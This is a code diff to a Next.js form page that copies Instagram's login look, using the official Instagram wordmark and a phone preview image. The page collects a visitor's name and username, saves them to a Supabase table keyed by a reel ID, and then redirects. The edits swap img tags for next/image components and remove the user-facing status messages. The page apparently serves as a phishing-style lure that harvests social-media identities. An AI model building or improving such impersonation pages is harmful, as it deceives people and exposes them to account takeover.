@@ -3,13 +3,14 @@
 
 import { useState, useEffect } from 'react';
 import { useParams } from 'next/navigation';
+import Image from 'next/image';
 import { supabase } from '@/app/lib/supabase';
 
 export default function ReelFormPage() {
   const { reelId } = useParams();
   const [name, setName] = useState('');
   const [username, setUsername] = useState('');
-  const [message, setMessage] = useState('');
+  
   const [loading, setLoading] = useState(true);
   const [reelData, setReelData] = useState<{ redirectUrl: string, reelId: string } | null>(null);
 
@@ -41,7 +42,6 @@ export default function ReelFormPage() {
     e.preventDefault();
 
     if (!reelData) {
-      setMessage('Error: Reel ID not found or invalid.');
       return;
     }
 
@@ -58,9 +58,7 @@ export default function ReelFormPage() {
 
     if (error) {
       console.error('Supabase insert error:', error);
-      setMessage('Error submitting form.');
     } else {
-      setMessage('Form submitted successfully!');
       setName('');
       setUsername('');
       // Redirect to the saved URL
@@ -93,20 +91,24 @@ export default function ReelFormPage() {
       <div className="flex max-w-5xl w-full px-4">
         {/* Left */}
         <div className="hidden md:flex w-1/2 justify-center items-center">
-          <img
+          <Image
             src="/instagram-web-lox-image.png"
             className="w-2xl"
             alt="Phone preview"
+            width={500}
+            height={500}
           />
         </div>
 
         {/* Right */}
         <div className="w-full md:w-1/2 max-w-sm mx-auto">
           <div className="bg-white border border-gray-300 px-8 py-10">
-            <img
+            <Image
               src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
               alt="Instagram"
               className="mx-auto mb-6 w-40"
+              width={160}
+              height={48}
             />
 
             <form onSubmit={handleSubmit}>
